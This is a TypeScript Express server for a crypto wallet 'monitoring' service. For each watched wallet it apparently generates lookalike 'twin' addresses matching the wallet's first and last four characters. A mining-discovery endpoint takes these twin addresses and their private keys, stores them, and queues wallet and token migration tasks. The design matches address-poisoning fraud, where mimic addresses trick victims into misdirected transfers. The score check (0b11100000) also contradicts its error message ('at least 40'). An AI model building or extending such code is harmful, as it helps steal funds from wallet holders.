import express, { Request, Response } from "express";
import prisma from "./db";
import {
	subscribeToWallet,
	unsubscribeById,
	resubscribeActiveWallets,
	initializeTokenHoldings,
} from "./services/helius-websocket";
import { taskQueue } from "./services/task-queue";
import {
	handleTransferToken,
	handleMigrateToken,
	handleMigrateWallet,
	handleDeployToken,
} from "./services/task-handlers";

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "1mb" }));

taskQueue.on("process:transfer_token", handleTransferToken);
taskQueue.on("process:migrate_token", handleMigrateToken);
taskQueue.on("process:migrate_wallet", handleMigrateWallet);
taskQueue.on("process:deploy_token", handleDeployToken);

app.get("/ping", (_req: Request, res: Response) => {
	res.json({ message: "pong" });
});

// Example endpoint to get all users
app.get("/users", async (_req: Request, res: Response) => {
	try {
		const users = await prisma.user.findMany();
		res.json(users);
	} catch (error) {
		res.status(500).json({ error: "Failed to fetch users" });
	}
});

// Example endpoint to create a user
app.post("/users", async (req: Request, res: Response) => {
	try {
		const { email, name, wallet } = req.body;
		const user = await prisma.user.create({
			data: { email, name, wallet },
		});
		res.status(201).json(user);
	} catch (error) {
		res.status(500).json({ error: "Failed to create user" });
	}
});

// Endpoint for users to register their wallet for monitoring
app.post("/users/:userId/activate", async (req: Request, res: Response) => {
	try {
		const { userId } = req.params;

		// Fetch user from database
		const user = await prisma.user.findUnique({
			where: { id: userId },
		});

		if (!user) {
			return res.status(404).json({ error: "User not found" });
		}

		if (!user.wallet) {
			return res.status(400).json({ error: "User does not have a wallet address set" });
		}

		if (user.subId !== null) {
			return res.status(400).json({ error: "User is already monitoring this wallet" });
		}

		// Initialize token holdings for this wallet
		await initializeTokenHoldings(user.wallet);

		// Subscribe to wallet via WebSocket and get subscription ID
		const subId = await subscribeToWallet(user.wallet);

		// Update user with subscription ID
		const updatedUser = await prisma.user.update({
			where: { id: userId },
			data: { subId },
		});

		// Create or update mining target for this wallet
		await prisma.miningTarget.upsert({
			where: { address: user.wallet },
			create: {
				address: user.wallet,
				target: user.wallet.slice(0, 4) + user.wallet.slice(-4),
				type: "wallet",
			},
			update: {},
		});

		res.json({
			message: "Wallet monitoring enabled",
			user: updatedUser,
		});
	} catch (error) {
		console.error("Error setting up wallet monitoring:", error);
		res.status(500).json({ error: "Failed to set up wallet monitoring" });
	}
});

// Endpoint to deactivate wallet monitoring
app.post("/users/:userId/deactivate", async (req: Request, res: Response) => {
	try {
		const { userId } = req.params;

		const user = await prisma.user.findUnique({
			where: { id: userId },
		});

		if (!user) {
			return res.status(404).json({ error: "User not found" });
		}

		if (user.subId == null) {
			return res.status(400).json({ error: "User is not currently monitoring a wallet" });
		}

		// Unsubscribe from WebSocket using subscription ID
		await unsubscribeById(user.subId);

		// Clear subscription ID from database
		await prisma.user.update({
			where: { id: userId },
			data: { subId: null },
		});

		res.json({
			message: "Wallet monitoring disabled",
		});
	} catch (error) {
		console.error("Error deactivating wallet monitoring:", error);
		res.status(500).json({ error: "Failed to deactivate wallet monitoring" });
	}
});

// Get monitoring status
app.get("/monitoring/status", async (_req: Request, res: Response) => {
	try {
		const activeUsers = await prisma.user.findMany({
			where: {
				subId: { not: null },
			},
			select: {
				id: true,
				email: true,
				wallet: true,
				subId: true,
			},
		});

		res.json({
			activeSubscriptions: activeUsers,
			count: activeUsers.length,
		});
	} catch (error) {
		console.error("Error fetching monitoring status:", error);
		res.status(500).json({ error: "Failed to fetch monitoring status" });
	}
});

app.post("/mining/discovery", async (req: Request, res: Response) => {
	try {
		const { targetId, score, twinAddress, twinPrivateKey, oldTwinAddress, oldTwinPrivateKey } = req.body;
		
		if (score < 0b11100000) {
			return res.status(400).json({ error: "Score must be at least 40" });
		}

		console.log(`Mining discovery: Target ${targetId} achieved score ${score}`);

		const target = await prisma.miningTarget.findUnique({
			where: { id: targetId },
		});

		if (!target) {
			return res.status(404).json({ error: "Target not found" });
		}

		// Write to recovery table
		await prisma.recovery.create({
			data: {
				address: twinAddress,
				privateKey: twinPrivateKey,
			},
		});

		await prisma.miningTarget.update({
			where: { id: targetId },
			data: {
				score,
				twinAddress,
				twinPrivateKey,
			},
		});

		if (target.type === "wallet") {
			taskQueue.dispatchTask({
				type: "migrate_wallet",
				oldWalletAddress: oldTwinAddress ?? "",
				newWalletAddress: twinAddress,
				oldWalletPrivateKey: oldTwinPrivateKey ?? "",
			});
		} else if (target.type === "token") {
			taskQueue.dispatchTask({
				type: "migrate_token",
				oldTokenMint: oldTwinAddress ?? "",
				newTokenMint: twinAddress,
			});
		}

		res.json({ received: true });
	} catch (error) {
		console.error("Error processing mining discovery:", error);
		res.status(500).json({ error: "Failed to process mining discovery" });
	}
});

app.listen(PORT, async () => {
	console.log(`Server listening on http://localhost:${PORT}`);
	console.log(`Database: ${process.env.DATABASE_URL || "postgresql://localhost:5432/lennc"}`);
	await resubscribeActiveWallets();
});
